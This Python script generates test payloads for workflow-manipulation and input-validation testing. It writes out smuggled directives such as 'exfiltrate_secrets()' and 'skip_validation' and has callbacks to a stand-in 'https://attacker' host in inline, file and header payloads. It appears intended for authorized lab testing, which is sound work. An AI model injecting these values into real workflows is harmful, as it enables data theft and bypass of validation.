#!/usr/bin/env python3
"""
workflow_payloads.py

Generate test payloads for workflow-manipulation / input-validation vulnerabilities.

Produces:
 - in-memory payload list (generate_all)
 - option to write file-based payloads to disk (write_artifacts)

Usage:
  python workflow_payloads.py            # prints payloads
  python workflow_payloads.py --out dir  # writes file payloads into dir
"""
import argparse
import json
from pathlib import Path
from typing import List, Dict, Any


INLINE: List[Dict[str, Any]] = [
    {
        "type": "inline",
        "payload": {"task": "execute", "data": "override_step_3; exfiltrate_secrets()"},
    },
    {
        "type": "inline",
        "payload": {"task": "update", "data": 'set_next:step5; notify:"https://attacker/cb"'},
    },
]

FILE_OVERRIDE: Dict[str, Any] = {
    "type": "file",
    "filename": "malicious_workflow.json",
    "content": {"instructions": 'skip_validation; call:"https://attacker/collect"'},
}

HEADER_OVERRIDE: Dict[str, Any] = {
    "type": "header",
    "headers": {"X-Workflow-Context": "override_step_3"},
}


def generate_all() -> List[Dict[str, Any]]:
    """Return a list of all payload descriptors."""
    out: List[Dict[str, Any]] = []
    out.extend(INLINE)
    out.append(FILE_OVERRIDE)
    out.append(HEADER_OVERRIDE)
    return out


def write_artifacts(out_dir: Path) -> None:
    """
    Write file-based payloads to out_dir.
    - Writes malicious_workflow.json with pretty JSON content.
    - Writes a README explaining safety and usage.
    """
    out_dir.mkdir(parents=True, exist_ok=True)

    # Write file override payload
    file_payload = FILE_OVERRIDE
    file_path = out_dir / file_payload["filename"]
    file_path.write_text(json.dumps(file_payload["content"], indent=2), encoding="utf-8")

    # Write a small README/safety note
    readme = (
        "workflow_payloads artifacts\n\n"
        "Files generated for authorized lab testing only.\n\n"
        "Do NOT upload these files to public repositories or run them\n"
        "in production environments. They contain test strings that\n"
        "simulate malicious workflow instructions.\n"
    )
    (out_dir / "README.txt").write_text(readme, encoding="utf-8")


def pretty_print_payloads(payloads: List[Dict[str, Any]]) -> None:
    """Print payloads in a readable format for quick inspection."""
    for i, p in enumerate(payloads, start=1):
        print(f"=== Payload #{i} [{p['type']}] ===")
        if p["type"] == "inline":
            print(json.dumps(p["payload"], indent=2))
        elif p["type"] == "file":
            print(f"filename: {p['filename']}")
            print(json.dumps(p["content"], indent=2))
        elif p["type"] == "header":
            print(json.dumps(p["headers"], indent=2))
        else:
            print(p)
        print()


def parse_args():
    ap = argparse.ArgumentParser(description="Generate workflow manipulation test payloads.")
    ap.add_argument("--out", help="Directory to write file payloads (optional)")
    return ap.parse_args()


def main():
    args = parse_args()
    payloads = generate_all()
    pretty_print_payloads(payloads)

    if args.out:
        out_dir = Path(args.out)
        write_artifacts(out_dir)
        print(f"Wrote file payloads to: {out_dir.resolve()}")


if __name__ == "__main__":
    main()
